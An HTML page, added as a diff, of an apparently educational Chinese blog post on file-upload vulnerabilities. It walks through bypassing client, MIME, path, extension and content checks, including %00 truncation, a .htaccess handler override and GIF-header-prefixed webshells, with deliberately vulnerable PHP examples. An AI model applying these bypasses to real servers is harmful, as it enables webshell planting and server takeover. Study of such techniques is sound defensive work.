@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <title>
+        
+        WEB文件上传漏洞总结 · \xeb\xfe&#39;s Blog
+        
+    </title>
+    <link rel="icon" href= /assests/favicon.ico>
+    <!-- TODO: 在font-face加载完毕后改变字体  -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js"></script>
+<script>
+hljs.initHighlightingOnLoad();
+$('pre code').each(function(i, block) {
+  //hljs.highlightBlock(block);
+  var lines = $(this).text().split('\n').length - 1;
+  var $numbering = $('<ul/>').addClass('pre-numbering');
+  $(this)
+    .addClass('has-numbering')
+    .parent()
+    .append($numbering);
+  for(i=1;i<=lines;i++){
+    $numbering.append($('<li/>').text(i));
+  }
+});
+</script>
+<style>
+code.has-numbering {
+  margin-left: 10px;
+  word-wrap: normal;
+  word-break: keep-all;
+  white-space: pre;
+}
+
+.pre-numbering {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 20px;
+  height: 100%;
+  padding: .5em 0.2em .5em 0;
+  border-right: 1px solid #C3CCD0;
+  border-radius: 3px 0 0 3px;
+  background-color: #EEE;
+  text-align: right;
+  font-size: 1.0em;
+  color: #AAA;
+  list-style: none;
+}
+@media (max-width: 767px) {
+  .pre-numbering {
+    display: none;
+  }
+  .has-numbering {
+    margin-left: -10px !important;
+    word-wrap: break-world !important;
+    white-space: pre-wrap !important;
+  }
+}
+overflow-x: auto;
+overflow-y: auto;
+word-break: keep-all;
+white-space: pre;
+</style>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/styles/default.min.css">
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.12.0/build/highlight.min.js"></script>
+    <!-- 提前加载place holder  -->
+    <style type="text/css">
+        @font-face {
+            font-family: 'Oswald-Regular';
+            src: url(/font/Oswald-Regular.ttf);
+        }
+    </style>
+    <style type="text/css">
+        .site-intro-placeholder {
+            position: absolute;
+            z-index: -2;
+            top: 0;
+            left: 0px;
+            width: calc(100% + 300px);
+            height: 100%;
+            background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+            background-position: center center;
+            transform: translate3d(-226px, 0, 0);
+            animation: gradient-move 2.5s ease-out 0s 1;
+        }
+        @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+    <link rel="stylesheet" href = /css/style.css?v=20171020 />
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    
+    <script src="/scripts/main.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >\xeb\xfe&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">WEB文件上传漏洞总结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>\xeb\xfe's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(http://oumn0o088.bkt.clouddn.com/post-bg.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            WEB文件上传漏洞总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-href = web渗透-文件上传>web渗透-文件上传</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2017/12/11</span>
+            </div>
+        
+    </div>
+</div>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <script>
+            var browser = {
+                    versions: function () {
+                        var u = window.navigator.userAgent;
+                        return {
+                            userAgent: u,
+                            trident: u.indexOf('Trident') > -1, //IE内核
+                            presto: u.indexOf('Presto') > -1, //opera内核
+                            webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+                            gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+                            mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+                            ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+                            android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+                            iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+                            iPad: u.indexOf('iPad') > -1, //是否为iPad
+                            webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+                            weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+                            uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+                        };
+                    }()
+                }
+
+            function fontLoaded(){
+                console.log('font loaded');
+                if (document.getElementsByClassName('site-intro-meta')) {
+                    document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+                    document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+                    var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+                        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+                        if (postIntroTags) {
+                            postIntroTags.classList.add('post-fade-in');
+                        }
+                        if (postIntroMeat) {
+                            postIntroMeat.classList.add('post-fade-in');
+                        }
+                    }
+                }
+                
+            console.log("userAgent:" + browser.versions.userAgent);
+            // UC不支持跨域，所以直接显示
+            if (browser.versions.uc) {
+                console.log("UCBrowser");
+                fontLoaded();
+            } else {
+                WebFont.load({
+                    custom: {
+                        families: ['Oswald-Regular']
+                    },
+                    loading: function () {  //所有字体开始加载
+                        // console.log('loading');
+                    },
+                    active: function () {  //所有字体已渲染
+                        fontLoaded();
+                    },
+                    inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+                        console.log('inactive: timeout');
+                        fontLoaded();
+                    },
+                    timeout: 7000 // Set the timeout to two seconds
+                });
+            }
+        </script>
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>文件上传漏洞可以说是日常渗透测试中用得最多的一个漏洞，用它获得服务器权限最快最直接。在Web程序中，经常需要用到文件上传的功能。如用户或者管理员上传图片，或者其它文件。如果没有限制上传类型或者限制不严格被绕过，就有可能造成文件上传漏洞。如果上传了可执行文件或者网页脚本，就会导致网站被控制甚至服务器沦陷。，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权或结合文件包含漏洞。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。</p>
+<h2 id="2-上传检测流程"><a href="#2-上传检测流程" class="headerlink" title="2. 上传检测流程"></a>2. 上传检测流程</h2><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：<br><img src="http://ofrdce5qv.bkt.clouddn.com/1.png" alt=""></p>
+<a id="more"></a>
+<ul>
+<li>客户端javascript校验（一般只校验文件的扩展名）</li>
+</ul>
+<ul>
+<li>服务端校验<ul>
+<li>文件头content-type字段校验（image/gif）</li>
+<li>文件内容头校验（GIF89a）</li>
+<li>目录路经检测（检测跟Path参数相关的内容）</li>
+<li>文件扩展名检测 (检测跟文件 extension 相关的内容)</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>自定义正则校验</li>
+</ul>
+</li>
+<li>WAF设备校验（根据不同的WAF产品而定）</li>
+</ul>
+<h2 id="3-客户端校验"><a href="#3-客户端校验" class="headerlink" title="3. 客户端校验"></a>3. 客户端校验</h2><p>这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法，有白名单形式也有黑名单形式。</p>
+<ul>
+<li>这类检测，通常是在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测扩展名是否合法，示例代码如下：</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">function CheckFileType()</span><br><span class="line">&#123;</span><br><span class="line">    var objButton=document.getElementById("Button1");//上传按钮</span><br><span class="line">    var objFileUpload=document.getElementById("FileUpload1");</span><br><span class="line">    var objMSG=document.getElementById("msg");//显示提示信息用DIV</span><br><span class="line">    var FileName=new String(objFileUpload.value);//文件名</span><br><span class="line">    var extension=new String(FileName.substring(FileName.lastIndexOf(".")+1,FileName.length));//文件扩展名</span><br><span class="line"></span><br><span class="line">    if(extension=="jpg"||extension=="JPG")//可以另行添加扩展名</span><br><span class="line">    &#123;</span><br><span class="line">        objButton.disabled=false;//启用上传按钮</span><br><span class="line">        objMSG.innerHTML="文件检测通过";</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        objButton.disabled=true;//禁用上传按钮</span><br><span class="line">        objMSG.innerHTML="请选择正确的文件上传";</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
+</ul>
+<p>绕过方法：</p>
+<ul>
+<li>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp</li>
+<li>上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firbug之类的插件把它禁掉）</li>
+</ul>
+<h2 id="4-服务端检测"><a href="#4-服务端检测" class="headerlink" title="4. 服务端检测"></a>4. 服务端检测</h2><h3 id="4-1-服务端MIME类型检测"><a href="#4-1-服务端MIME类型检测" class="headerlink" title="4.1. 服务端MIME类型检测"></a>4.1. 服务端MIME类型检测</h3><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p>
+<p>服务器端检测文件MIME类型可能的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = <span class="string">'./'</span>;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>绕过方法</li>
+</ul>
+<p>配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型<br><img src="http://ofrdce5qv.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720170717173714.png" alt=""><br>然后在对应目录生成shell.jpg</p>
+<h3 id="4-2-服务端目录路径检测"><a href="#4-2-服务端目录路径检测" class="headerlink" title="4.2. 服务端目录路径检测"></a>4.2. 服务端目录路径检测</h3><p><img src="http://ofrdce5qv.bkt.clouddn.com/3.png" alt=""></p>
+<ul>
+<li>上传的数据包中，如果存在path(或者其他名称)等能够操作上传路径的参数，修改该参数配合解析漏洞Get Webshell,测试代码</li>
+<li>条件：php版本5.3.4以下；gpc关闭</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'flv'</span>,<span class="string">'swf'</span>,<span class="string">'mp3'</span>,<span class="string">'mp4'</span>,<span class="string">'3gp'</span>,<span class="string">'zip'</span>,<span class="string">'rar'</span>,<span class="string">'gif'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'bmp'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],strpos($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$file_arr))</span><br><span class="line">    &#123;</span><br><span class="line">        $tempFile = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        <span class="comment">//这里的$_REQUEST['jieduan']造成可以利用截断上传</span></span><br><span class="line">        $targePath = $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].$_REQUEST[<span class="string">'jieduan'</span>].rand(<span class="number">10</span>,<span class="number">99</span>).</span><br><span class="line">            date(<span class="string">'YmdHis'</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tempFile,$targePath))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'上传成功'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'路径'</span>.$targePath;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">"上传失败"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"上传失败"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://ofrdce5qv.bkt.clouddn.com/4.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/5.png" alt=""></p>
+<h3 id="4-3-服务端文件扩展名检测"><a href="#4-3-服务端文件扩展名检测" class="headerlink" title="4.3. 服务端文件扩展名检测"></a>4.3. 服务端文件扩展名检测</h3><ul>
+<li>黑名单检测：<br>黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型，例如：html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc | bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh |phtm | shtm |inc等等。</li>
+</ul>
+<p>黑名单扩展名过滤，限制不够全面：IIS默认支持解析.asp | .cdx | .asa | .cer等<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//sunstr - 返回字符串的子串</span></span><br><span class="line">    <span class="comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span></span><br><span class="line">    <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $black_file = explode(<span class="string">"|"</span>,<span class="string">"php|jsp|asp"</span>);<span class="comment">//允许上传的文件类型组</span></span><br><span class="line">    $new_upload_file_ext = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])); <span class="comment">//取得被.隔开的最后字符串</span></span><br><span class="line">    <span class="keyword">if</span>(in_array($new_upload_file_ext,$black_file))</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"文件不合法"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $filename = time().<span class="string">"."</span>.$new_upload_file_ext;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],<span class="string">"upload/"</span>.$filename))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload Success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>不被允许的文件格式.php，但是可以上传文件名为shell.php_(下划线是空格)，IIS支持，linux不支持，详细见下面的特殊文件名绕过描述；</p>
+<ul>
+<li>白名单检测<br>仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止</li>
+<li><p>绕过方法：</p>
+<ul>
+<li><p>文件名大小写绕过</p>
+<p> 用像 AsP，pHp 之类的文件名绕过黑名单检测</p>
+</li>
+<li><p>名单列表绕过</p>
+<p> 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类 </p>
+</li>
+<li><p>特殊文件名绕过：</p>
+<p>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性</p>
+</li>
+<li><p>0x00截断</p>
+<p>文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中<br>在扩展名检测这大部分都是 asp 的程序有这种漏洞，给个简单的伪代码 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Name = getname(http requests)//假如这一步获取到的文件名是dama.asp .jpg</span><br><span class="line">Type = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件</span><br><span class="line">If(type == jpg)</span><br><span class="line">SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<p>操作方法：上传dama.jpg，Burp抓包，将文件名改为dama.php%00.jpg，选中%00，进行url-decode。<br><img src="http://ofrdce5qv.bkt.clouddn.com/6.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/7.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/8.png" alt=""></p>
+<pre><code>**PHP任意文件上传漏洞（CVE-2015-2348）**该漏洞存在于php的move_uploaded_file()函数中，这个函数一般在上传文件时被使用，用途是将上传的文件移动到新位置。这次的漏洞就出现在$destination这个参数中，这个参数代表的是上传文件移动的最终目的地址。如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传。
+
+演示代码：
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">move_uploaded_file(string $filename,string $destination)</span></span><br><span class="line"><span class="comment">$destination参数代表得失上传文件移动的最终目的地址</span></span><br><span class="line"><span class="comment">如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，</span></span><br><span class="line"><span class="comment">那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'Upload'</span>]))&#123;</span><br><span class="line">    $target_path = WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path = $target_path . basename($_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    $uploaded_name = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, <span class="string">'.'</span>) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'size'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($uploaded_ext == <span class="string">"jpg"</span> || $uploaded_ext == <span class="string">"JPG"</span> || $uploaded_ext == <span class="string">"jpeg"</span> || $uploaded_ext == <span class="string">"JPEG"</span>) &amp;&amp; ($uploaded_size &lt; <span class="number">100000</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], $_POST[<span class="string">'drops'</span>])) &#123;</span><br><span class="line">            $html .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            $html .= <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">            $html .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            $html .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">            $html .= $target_path . <span class="string">' succesfully uploaded!'</span>;</span><br><span class="line">            $html .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $html .= <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">        $html .= <span class="string">'Your image was not uploaded.'</span>;</span><br><span class="line">        $html .= <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</code></pre><p>然后我们上传文件，这里把POST的drops参数利用空字符进行截断<br><img src="http://ofrdce5qv.bkt.clouddn.com/13.png" alt=""></p>
+<ul>
+<li><p>.htaccess 文件攻击 </p>
+<p>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测,该文件仅在Apache平台上存在，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "a.jpg"&gt;</span></span><br><span class="line"> <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+<p>保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”a.jpg”字符串的任意文件，统一执行。如果这个”a.jpg”的内容是一句话木马，即可利用中国菜刀进行连接<br><img src="http://ofrdce5qv.bkt.clouddn.com/9.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/10.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/11.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/12.png" alt=""></p>
+<h3 id="4-4-服务端文件内容检测"><a href="#4-4-服务端文件内容检测" class="headerlink" title="4.4. 服务端文件内容检测"></a>4.4. 服务端文件内容检测</h3><ul>
+<li>文件幻数检测：</li>
+</ul>
+<p>JPG ： FF D8 FF E0 00 10 4A 46 49 46</p>
+<p>GIF ： 47 49 46 38 39 61 (GIF89a)</p>
+<p>PNG： 89 50 4E 47</p>
+<p>绕过方法：<br>在文件幻数后面加上自己的一句话木马就行了。</p>
+<ul>
+<li>文件相关信息检测：</li>
+</ul>
+<p>一般就是检查图片文件的大小，图片文件的尺寸之类的信息。</p>
+<p>绕过方法：<br>伪造好文件幻数，在后面添加一句话木马之后，再添加一些其他的内容，增大文件的大小。</p>
+</li>
+</ul>
+<p><strong>通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可。</strong></p>
+<p>   简化的演示代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(getimagesize(<span class="string">"shell.php"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://ofrdce5qv.bkt.clouddn.com/14.png" alt=""><br>加上GIF头内容<br><img src="http://ofrdce5qv.bkt.clouddn.com/15.png" alt=""></p>
